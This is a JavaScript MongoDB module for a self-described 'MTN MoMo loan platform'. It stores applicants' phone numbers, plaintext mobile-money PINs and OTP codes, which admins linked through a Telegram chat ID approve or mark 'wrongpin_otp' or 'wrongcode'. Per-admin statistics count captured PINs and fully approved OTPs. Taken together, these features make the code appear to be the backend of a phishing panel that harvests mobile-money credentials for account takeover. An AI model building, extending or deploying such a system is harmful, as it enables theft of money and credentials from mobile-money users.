const { MongoClient } = require('mongodb');
require('dotenv').config();

let client;
let db;

// Database and collections
const DB_NAME = 'mtn_momo_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Ensures DB connection is active before executing queries
 */
async function ensureDb() {
    if (!db) {
        await connectDatabase();
    }
    if (!db) {
        throw new Error('Database is not initialized or connected.');
    }
    return db;
}

/**
 * Connect to MongoDB with connection pooling safety
 */
async function connectDatabase() {
    if (db) return db; // Return existing connection if initialized

    try {
        const MONGODB_URI = process.env.MONGODB_URI || process.env.DATABASE_URL;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }

        console.log('🔄 Connecting to MongoDB (MTN MoMo Platform)...');

        client = new MongoClient(MONGODB_URI, {
            maxPoolSize: 10,
            minPoolSize: 2,
            serverSelectionTimeoutMS: 5000,
            connectTimeoutMS: 10000
        });

        await client.connect();
        db = client.db(DB_NAME);

        console.log('✅ Connected to MongoDB successfully');

        await createIndexes();
        await seedSuperAdmin();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Seed Super Admin (ADMIN001) if not present
 */
async function seedSuperAdmin() {
    try {
        const database = await ensureDb();
        const superAdminExists = await database.collection(COLLECTIONS.ADMINS).findOne({ adminId: 'ADMIN001' });
        if (!superAdminExists) {
            const superAdminDocument = {
                adminId: 'ADMIN001',
                name: 'Super Admin',
                email: 'admin@momo.cm',
                chatId: null, // Will be linked when ADMIN001 runs /start
                status: 'active',
                createdAt: new Date().toISOString()
            };
            await database.collection(COLLECTIONS.ADMINS).insertOne(superAdminDocument);
            console.log('⭐ Seeded default Super Admin (ADMIN001)');
        }
    } catch (error) {
        console.error('⚠️ Error seeding super admin:', error.message);
    }
}

/**
 * Create database indexes safely
 */
async function createIndexes() {
    try {
        const database = await ensureDb();
        await Promise.all([
            database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }, { sparse: true }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }, { sparse: true }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 }),

            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 }),

            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 }),
            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 }),
            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 })
        ]);

        console.log('✅ Database indexes verified');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection safely
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        db = null;
        client = null;
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ENVIRONMENT LOGS OPERATIONS
// ==========================================

async function logAdminActivity(adminId, action, details = {}) {
    try {
        const database = await ensureDb();
        const logEntry = {
            adminId,
            action,
            details,
            timestamp: new Date().toISOString()
        };
        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
    } catch (error) {
        console.error('❌ Error recording environment log:', error.message);
    }
}

async function getEnvironmentLogs(query = {}, limit = 100) {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.ENVIRONMENT_LOGS)
            .find(query)
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();
    } catch (error) {
        console.error('❌ Error getting environment logs:', error);
        return [];
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const database = await ensureDb();
        const adminId = adminData.adminId || adminData.id;

        if (!adminId)         throw new Error('Admin ID is required');
        if (!adminData.name)  throw new Error('Admin name is required');

        const normalizedChatId = adminData.chatId !== undefined && adminData.chatId !== null 
            ? (typeof adminData.chatId === 'number' ? adminData.chatId : String(adminData.chatId).trim()) 
            : null;

        const adminDocument = {
            adminId,
            name:      adminData.name,
            email:     adminData.email || '',
            chatId:    normalizedChatId,
            status:    adminData.status || 'active',
            updatedAt: new Date().toISOString()
        };

        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { 
                $set: adminDocument,
                $setOnInsert: { createdAt: adminData.createdAt ? new Date(adminData.createdAt).toISOString() : new Date().toISOString() } 
            },
            { upsert: true }
        );

        await logAdminActivity(adminId, 'ADMIN_SAVED', { name: adminData.name, email: adminData.email });

        console.log(`✅ Admin saved/updated successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    if (!chatId) return null;
    try {
        const database = await ensureDb();
        const strChatId = String(chatId).trim();
        const numChatId = Number(strChatId);

        return await database.collection(COLLECTIONS.ADMINS).findOne({
            $or: [
                { chatId: strChatId },
                { chatId: isNaN(numChatId) ? strChatId : numChatId }
            ]
        });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: 1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const database = await ensureDb();
        const payload = { ...updates, updatedAt: new Date().toISOString() };
        if (payload.chatId !== undefined && payload.chatId !== null) {
            payload.chatId = typeof payload.chatId === 'number' ? payload.chatId : String(payload.chatId).trim();
        }

        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: payload }
        );
        
        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);

        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const database = await ensureDb();
        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        
        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });

        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const database = await ensureDb();
        const result = await database.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        
        await logAdminActivity(adminId, 'ADMIN_DELETED', {});

        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const database = await ensureDb();
        const count = await database.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const database = await ensureDb();
        const document = {
            id:              appData.id,
            adminId:         appData.adminId,
            adminName:       appData.adminName || '',
            phoneNumber:     appData.phoneNumber,
            pin:             appData.pin,
            pinStatus:       appData.pinStatus  || 'pending',
            otpStatus:       appData.otpStatus  || 'pending',
            otp:             appData.otp        || null,
            assignmentType:  appData.assignmentType || 'auto',
            isReturningUser: appData.isReturningUser || false,
            previousCount:   appData.previousCount   || 0,
            timestamp:       appData.timestamp || new Date().toISOString()
        };

        const result = await database.collection(COLLECTIONS.APPLICATIONS).insertOne(document);

        if (appData.adminId) {
            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
        }

        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const database = await ensureDb();
        const result = await database.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
        }

        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        const database = await ensureDb();
        return await database.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const database = await ensureDb();
        const stats = await database.collection(COLLECTIONS.APPLICATIONS).aggregate([
            { $match: { adminId } },
            {
                $group: {
                    _id: null,
                    total: { $sum: 1 },
                    pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
                    pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
                    otpPending: {
                        $sum: {
                            $cond: [
                                { $and: [{ $eq: ['$otpStatus', 'pending'] }, { $eq: ['$pinStatus', 'approved'] }] },
                                1,
                                0
                            ]
                        }
                    },
                    fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } }
                }
            }
        ]).toArray();

        if (stats.length > 0) {
            const { _id, ...counts } = stats[0];
            return counts;
        }

        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const database = await ensureDb();
        const [totalAdmins, appStats] = await Promise.all([
            database.collection(COLLECTIONS.ADMINS).countDocuments({}),
            database.collection(COLLECTIONS.APPLICATIONS).aggregate([
                {
                    $group: {
                        _id: null,
                        totalApplications: { $sum: 1 },
                        pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
                        pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
                        otpPending: { $sum: { $cond: [{ $eq: ['$otpStatus', 'pending'] }, 1, 0] } },
                        fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } },
                        totalRejected: {
                            $sum: {
                                $cond: [
                                    {
                                        $or: [
                                            { $eq: ['$pinStatus', 'rejected'] },
                                            { $eq: ['$otpStatus', 'wrongpin_otp'] },
                                            { $eq: ['$otpStatus', 'wrongcode'] }
                                        ]
                                    },
                                    1,
                                    0
                                ]
                            }
                        }
                    }
                }
            ]).toArray()
        ]);

        const counts = appStats[0] || {};
        return {
            totalAdmins,
            totalApplications: counts.totalApplications || 0,
            pinPending:        counts.pinPending || 0,
            pinApproved:       counts.pinApproved || 0,
            otpPending:        counts.otpPending || 0,
            fullyApproved:     counts.fullyApproved || 0,
            totalRejected:     counts.totalRejected || 0
        };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const database = await ensureDb();
        const admins = await database.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const database = await ensureDb();
        const result = await database.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,

    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    logAdminActivity,
    getEnvironmentLogs,

    getAdminStats,
    getStats,
    getPerAdminStats,

    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
